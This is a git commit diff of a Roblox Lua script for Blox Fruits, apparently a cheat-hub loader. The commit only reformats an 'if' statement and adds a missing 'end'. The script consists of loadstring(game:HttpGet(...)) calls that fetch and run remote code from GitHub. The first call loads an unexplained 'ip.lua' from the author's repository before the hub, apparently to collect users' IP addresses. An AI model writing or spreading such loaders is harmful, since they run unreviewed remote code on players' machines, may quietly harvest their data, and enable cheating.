d8b0957eba7800dad43d01a1c67eaadf657c81b9
xielbers <88589081+xielbers@users.noreply.github.com>
2025-03-27 12:16:24 -0300

    Update blox-fruits_cokka-hub.lua

--- blox-fruits_cokka-hub.lua
+++ blox-fruits_cokka-hub.lua
@@ -1,5 +1,5 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/refs/heads/main/copy/ip.lua'))()
 
 print(game.PlaceId)
-if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 or game.PlaceId == 7449423635 then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/UserDevEthical/Loadstring/main/CokkaHub.lua"))()
+if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 or game.PlaceId == 7449423635 then loadstring(game:HttpGet("https://raw.githubusercontent.com/UserDevEthical/Loadstring/main/CokkaHub.lua"))()
+end
